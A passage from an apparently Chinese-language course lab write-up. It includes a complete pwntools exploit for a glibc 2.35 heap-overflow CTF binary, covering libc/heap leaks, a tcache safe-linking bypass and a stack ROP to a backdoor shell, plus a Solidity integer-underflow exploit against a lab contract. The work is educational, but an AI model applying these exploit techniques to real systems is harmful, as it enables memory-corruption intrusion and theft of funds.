class="comment"># 7</span></span><br><span class="line">index_8 = handle_add(<span class="string">b"heap_8"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    handle_add(<span class="string">b"heap_dup"</span>, <span class="string">b"1"</span>, <span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># dup</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>首先利用堆溢出，覆盖下一个chunk的size位为一个比较大的数，这样这个chunk被free掉之后会进入到unsorted bin。再次分配堆块会优先从unsorted bin里切割，里面会残留<code>fd</code> 和<code>bk</code>指针，还有<code>fd_next_size</code>， <code>bk_next_size</code>。根据上述信息，可以算出堆地址，<code>key</code>和<code>libc</code>基地址</li>
+</ul>
+<blockquote>
+<p>在改size位让堆块进入unsorted bin的前提是，被修改之后的堆块的<code>heap_addr + size</code>地址处必须是一个合法的堆块（<code>free</code>堆块检查），不然程序会<code>abort</code>掉。</p>
+<p>所以本人对列表里能存储的16个<code>info</code>精打细算。</p>
+<p>拿本题举例，假设现在堆块的分布为：</p>
+<p><code>[0x70 0x50] [0x70 0x50] [0x70 0x50]</code></p>
+<p>我们通过溢出第一个<code>intro</code>来打到第二个<code>info</code>的size位，让其变为<code>0xb0</code>，现在堆块的分布为：</p>
+<p><code>[0x70 0x50] (heap_addr)[0xb0(0x70 + 0x50)] [0x70 0x50]</code></p>
+<p>此时<code>heap_addr + 0xb0</code>是第三个<code>info</code>堆块，是合法堆块，这样就可以绕过<code>free</code>的检查。</p>
+<p>所以本题在分配了<code>0 - 8</code>个堆块之后，又分配了7个堆块。</p>
+<p>保证了在修改8号堆块的size位后，可以让<code>heap_8_addr + big_size</code>落在合法堆块上。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">0x40</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">7</span> * <span class="number">0xb0</span> + <span class="number">1</span>)</span><br><span class="line">handle_edit(index_7, <span class="string">b"1"</span>, <span class="string">b"heap_0"</span> , payload, <span class="string">b"1"</span>)</span><br><span class="line">handle_del(index_8, <span class="string">b"1"</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/06/26/Ssec/image-20241106180809928.png"></p>
+<ul>
+<li>再申请一个堆块，切割<code>unsorted bin</code>，泄露<code>libc</code>和<code>heap_addr</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">index_leak = handle_add(<span class="string">b"1"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line">unsorted_leak, _, _ =handle_show(index_leak, <span class="string">b"1"</span>)</span><br><span class="line">libc_base = u64(unsorted_leak[<span class="number">8</span>:<span class="number">16</span>]) - (<span class="number">0x7f6a4a6d1100</span> - <span class="number">0x7f6a4a4b6000</span>)</span><br><span class="line">heap_base = u64(unsorted_leak[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">"__environ"</span>]</span><br><span class="line">key = heap_base &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">f"libc_base =&gt; <span class="subst">{<span class="built_in">hex</span>(libc_base)}</span>"</span>)</span><br><span class="line">success(<span class="string">f"heap_base =&gt; <span class="subst">{<span class="built_in">hex</span>(heap_base)}</span>"</span>)</span><br><span class="line">success(<span class="string">f"key =&gt; <span class="subst">{<span class="built_in">hex</span>(key)}</span>"</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/06/26/Ssec/image-20241106180855819.png"></p>
+<p>之后就是<code>libc 2.35</code>的常规操作了</p>
+<ul>
+<li>利用第一组堆块打<code>stack leak</code>, 通过0号堆块的堆溢出控已<code>free</code>的1号堆块的<code>fd</code>，申请到<code>__environ - 0x10</code>，泄露<code>__environ</code>中保存的栈指针，进而泄露栈地址。算出其和<code>user_add func retaddr</code>的偏移。</li>
+<li>利用第二组堆块打<code>rop</code>, 申请到<code>user_add func retaddr</code>处的栈空间，让<code>user_add</code>函数运行后落回后门函数<code>back door</code>（注意栈对齐）在申请堆块完成后，执行后门函数，获取shell。</li>
+</ul>
+<h4 id="关于glibc堆保护机制的进化演变">关于<code>glibc</code>堆保护机制的进化演变</h4>
+<ul>
+<li><p><code>glibc2.34</code>之后删除了库函数中的<code>__malloc_hook</code>, <code>__free_hook</code>等钩子，所以我们没办法通过覆写<code>hook</code>来<code>getshell</code></p></li>
+<li><p><code>glibc2.32</code>之后引入了堆内存对齐检查。申请的堆块的地址一定要是<code>8</code>字节的整数倍。</p></li>
+<li><p><code>glibc2.32</code>之后在使用<code>fastbin</code>和<code>tachebin</code>申请堆块时，增加了<code>fd</code>指针的校验：</p>
+<blockquote>
+<p>由于之前版本的<code>fd</code>指针可以任意写导致不安全，<code>glibc2.32</code>之后，在使用<code>fastbin</code>和<code>tcachebin</code>两个堆块管理结构申请堆块时，增加了对<code>fd</code>指针的校验。</p>
+<p><code>glibc2.32</code>下<code>tcache_get</code> / <code>tcache_put</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">{</span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">detect a double free.  */</span></span><br><span class="line">e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">{</span><br><span class="line">tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">--(tcache-&gt;counts[tc_idx]);</span><br><span class="line">e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>可以看到，相比于<code>glibc2.31</code>， 函数在存取堆块的时候使用了两个宏保护指针：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>
+<p>即 <strong>tcache_entry-&gt;next中存放的chunk地址为与自身地址进行异或运算后所得到的值</strong>， 这就要求我们在利用 tcache_entry 进行任意地址写之前 <strong>需要我们提前泄漏出相应 chunk 的地址，即我们需要提前获得堆基址后才能进行任意地址写</strong></p>
+</blockquote></li>
+</ul>
+<p>本题的<code>exp</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">"./overflow-protect"</span>)</span><br><span class="line"></span><br><span class="line">p = process(elf.path)</span><br><span class="line"><span class="comment"># p = remote("8.154.20.109", 10403)</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_add</span>(<span class="params">name: <span class="built_in">bytes</span>, password: <span class="built_in">bytes</span>, intro: <span class="built_in">bytes</span>, motto: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    p.recvuntil(<span class="string">b"[ 5 ] leave\n&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"name &gt; "</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">b"password &gt; "</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line">    p.recvuntil(<span class="string">b"introduction &gt; "</span>)</span><br><span class="line">    p.send(intro)</span><br><span class="line">    p.recvuntil(<span class="string">b"motto &gt; "</span>)</span><br><span class="line">    p.send(motto)</span><br><span class="line">    p.recvuntil(<span class="string">b"at index "</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    data = p.recvline().strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_del</span>(<span class="params">index: <span class="built_in">int</span>, password: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    p.recvuntil(<span class="string">b"[ 5 ] leave\n&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">b"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index &gt; "</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b"password &gt; "</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_show</span>(<span class="params">index: <span class="built_in">int</span>, password: <span class="built_in">bytes</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>, <span class="built_in">bytes</span>]:</span><br><span class="line">    p.recvuntil(<span class="string">b"[ 5 ] leave\n&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index &gt; "</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b"password &gt; "</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line">    p.recvuntil(<span class="string">b"user name: "</span>)</span><br><span class="line">    recv_name = p.recvline().strip()</span><br><span class="line">    p.recvuntil(<span class="string">b"user motto: "</span>)</span><br><span class="line">    recv_motto = p.recvline().strip()</span><br><span class="line">    p.recvuntil(<span class="string">b"user intro: "</span>)</span><br><span class="line">    recv_intro = p.recvline().strip()</span><br><span class="line">    <span class="keyword">return</span> recv_name, recv_motto, recv_intro</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_edit</span>(<span class="params"></span></span><br><span class="line"><span class="params">    index: <span class="built_in">int</span>, password: <span class="built_in">bytes</span>, edit_name: <span class="built_in">bytes</span>, edit_intro: <span class="built_in">bytes</span>, edit_motto: <span class="built_in">bytes</span></span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b"[ 5 ] leave\n&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">b"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index &gt; "</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b"password &gt; "</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b"new name &gt; "</span>)</span><br><span class="line">    p.send(edit_name)</span><br><span class="line">    p.recvuntil(<span class="string">b"new introduction &gt; "</span>)</span><br><span class="line">    p.send(edit_intro)</span><br><span class="line">    p.recvuntil(<span class="string">b"new motto &gt; "</span>)</span><br><span class="line">    p.send(edit_motto)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b"Please input your StudentID:\n"</span>, <span class="built_in">str</span>(<span class="number">3220105108</span>))</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401334</span></span><br><span class="line"><span class="comment"># ID_validation()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stack leak</span></span><br><span class="line">index_0 = handle_add(<span class="string">b"heap_0"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 0</span></span><br><span class="line">index_1 = handle_add(<span class="string">b"heap_1"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line">index_2 = handle_add(<span class="string">b"heap_2"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stack attack</span></span><br><span class="line">index_3 = handle_add(<span class="string">b"heap_3"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 3</span></span><br><span class="line">index_4 = handle_add(<span class="string">b"heap_4"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 4</span></span><br><span class="line">index_5 = handle_add(<span class="string">b"heap_5"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 5</span></span><br><span class="line">index_6 = handle_add(<span class="string">b"heap_6"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc / heap leak</span></span><br><span class="line">index_7 = handle_add(<span class="string">b"heap_7"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 7</span></span><br><span class="line">index_8 = handle_add(<span class="string">b"heap_8"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    handle_add(<span class="string">b"heap_dup"</span>, <span class="string">b"1"</span>, <span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">0x40</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">7</span> * <span class="number">0xb0</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">handle_edit(index_7, <span class="string">b"1"</span>, <span class="string">b"heap_0"</span> , payload, <span class="string">b"1"</span>)</span><br><span class="line">handle_del(index_8, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">index_leak = handle_add(<span class="string">b"1"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line">unsorted_leak, _, _ =handle_show(index_leak, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(unsorted_leak[<span class="number">8</span>:<span class="number">16</span>]) - (<span class="number">0x7f6a4a6d1100</span> - <span class="number">0x7f6a4a4b6000</span>)</span><br><span class="line">heap_base = u64(unsorted_leak[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">"__environ"</span>]</span><br><span class="line">key = heap_base &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">f"libc_base =&gt; <span class="subst">{<span class="built_in">hex</span>(libc_base)}</span>"</span>)</span><br><span class="line">success(<span class="string">f"heap_base =&gt; <span class="subst">{<span class="built_in">hex</span>(heap_base)}</span>"</span>)</span><br><span class="line">success(<span class="string">f"key =&gt; <span class="subst">{<span class="built_in">hex</span>(key)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">handle_del(index_2, <span class="string">b"1"</span>)</span><br><span class="line">handle_del(index_1, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">0x40</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(key ^ (environ - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">handle_edit(index_0, <span class="string">b"1"</span>, <span class="string">b"heap_1"</span>, payload, <span class="string">b"1"</span>)</span><br><span class="line">index_pad = handle_add(<span class="string">b"heap_pad"</span>, <span class="string">b"1"</span>, <span class="string">b"1"</span>, <span class="string">b"1"</span>)</span><br><span class="line">index_leak_stack = handle_add(<span class="string">b"A"</span> * <span class="number">0x10</span>, <span class="string">b"1"</span>, <span class="string">b"1"</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">stack_leak, _, _ = handle_show(index_leak_stack, <span class="string">b"1"</span>)</span><br><span class="line">stack_addr_attack = u64(stack_leak[<span class="number">16</span>:<span class="number">24</span>].ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - (<span class="number">0x7ffda4bd4a58</span> - <span class="number">0x7ffda4bd4908</span>) </span><br><span class="line"></span><br><span class="line">success(<span class="string">f"add_func_retaddr =&gt; <span class="subst">{<span class="built_in">hex</span>(stack_addr_attack)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">handle_del(index_5, <span class="string">b"1"</span>)</span><br><span class="line">handle_del(index_4, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">0x40</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64((stack_addr_attack - <span class="number">8</span>) ^ key)</span><br><span class="line"></span><br><span class="line">handle_edit(index_3, <span class="string">b"1"</span>, <span class="string">b"heap_1"</span>, payload, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">index_pad = handle_add(<span class="string">b"heap_pad"</span>, <span class="string">b"1"</span>, <span class="string">b"1"</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">8</span> + p64(backdoor)</span><br><span class="line">index_leak_stack = handle_add(payload, <span class="string">b"1"</span>, <span class="string">b"1"</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>本地运行：</p>
+<p><img src="/2025/06/26/Ssec/image-20241106181833778.png"></p>
+<p>远程执行<code>flag.exe</code>程序：</p>
+<p><img src="/2025/06/26/Ssec/image-20241106181918762.png"></p>
+<p>flag: <code>ssec2023{sTi11_STROng_EnOUGh_TO_aRbi7R4RY_RW|a7c0d727}</code></p>
+<p>PS: 做完之后我才发现这题原来没开<code>Full Relro</code>...... 纯joker了属于是。</p>
+<p><img src="/2025/06/26/Ssec/image-20241106182032692.png"></p>
+<p>不是他怎么能不开呢？（bushi）</p>
+<h1 id="软件安全原理与实践-lab-4-智能合约">软件安全原理与实践 lab 4 智能合约</h1>
+<h2 id="以太坊区块链的基本操作">以太坊区块链的基本操作</h2>
+<p>向一个用户转账0.025eth</p>
+<p>交易的hash：<code>0xefb948a7a40bfe0021d3f6fd424345be8bab9c8ea779e0efba0fcf6e5ba40e90</code></p>
+<p>在区块链浏览器上查看该交易：</p>
+<p><img src="/2025/06/26/Ssec/image-20241208014422243.png"></p>
+<h2 id="以太坊智能合约基础">以太坊智能合约基础</h2>
+<p>在Remix上新建合约，合约内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleContract {</span><br><span class="line">    uint256 public number;</span><br><span class="line">    constructor() {</span><br><span class="line">        number = 1;</span><br><span class="line">    }</span><br><span class="line">    function set(uint256 x) public {</span><br><span class="line">        number = x;</span><br><span class="line">    }</span><br><span class="line">    function get() public view returns (uint256) {</span><br><span class="line">        return number;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>选择合适的编译器，编译并部署合约在<code>holesky</code>链上。</p>
+<p><img src="/2025/06/26/Ssec/image-20241207153532637.png"></p>
+<p>一次调用合约中的get和set函数。</p>
+<ul>
+<li>调用<code>get</code>函数</li>
+</ul>
+<p><img src="/2025/06/26/Ssec/image-20241207232216236.png"></p>
+<p><code>get</code>函数调用显示，<code>number</code>的初始值为1</p>
+<ul>
+<li>调用<code>set</code>函数</li>
+</ul>
+<p><img src="/2025/06/26/Ssec/image-20241207232312097.png"></p>
+<p>设置<code>number</code>为123</p>
+<ul>
+<li>再次调用<code>get</code>函数</li>
+</ul>
+<p><img src="/2025/06/26/Ssec/image-20241207232423594.png"></p>
+<p>观察到已经<code>number</code>已经变为123</p>
+<p>在钱包中可以观察看一笔新的交易：</p>
+<p><img src="/2025/06/26/Ssec/image-20241207232543311.png"></p>
+<p>在区块链浏览器中查看：</p>
+<p><img src="/2025/06/26/Ssec/image-20241208002948338.png"></p>
+<p>合约地址</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xab27424af39ac12e595a4dcc58dfd5bce07f2e02</span></span><br></pre></td></tr></table></figure>
+<h2 id="整形数溢出漏洞">整形数溢出漏洞</h2>
+<p>观察合约源码，在<code>transfer</code>中存在整形数溢出漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">event SendFlag();</span><br><span class="line">mapping(address =&gt; uint256) balances;</span><br><span class="line">uint256 public totalSupply;</span><br><span class="line">.....</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool) {</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>因为<code>balances</code>和<code>_value</code>都是256位无符号整形数，所以只要二者不想等，就可以绕过<code>require</code>的限制。</p>
+<p>在初始化时，<code>balances[msg.sender]</code>是20，所以我们只要传一个比20大的数就能使其下溢为一个很大的无符号数，接着调用<code>win</code>即可通过<code>win</code>中的<code>require</code>。</p>
+<p>调用链：<code>init</code>-&gt;<code>transfer(0x0..00, 50)</code>-&gt;<code>win</code></p>
+<p>本地测试，调用<code>win</code>的输出。</p>
+<p><img src="/2025/06/26/Ssec/image-20241208002007334.png"></p>
+<p>可以看到触发了<code>Sendflag</code>事件。</p>
+<p>远程测试，执行完<code>init-&gt;transfer</code>后调用<code>balanceof</code>查看账户，发现已经被溢出为了一个很大的数。</p>
+<p><img src="/2025/06/26/Ssec/image-20241208002206780.png"></p>
+<p><img src="/2025/06/26/Ssec/image-20241208002225306.png"></p>
+<p>最后调用<code>win</code>获取<code>flag</code></p>
+<p>合约地址：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x37277CE4d9E60972394DFba41840<span class="number">123d145268b7</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/06/26/Ssec/image-20241208002420199.png"></p>
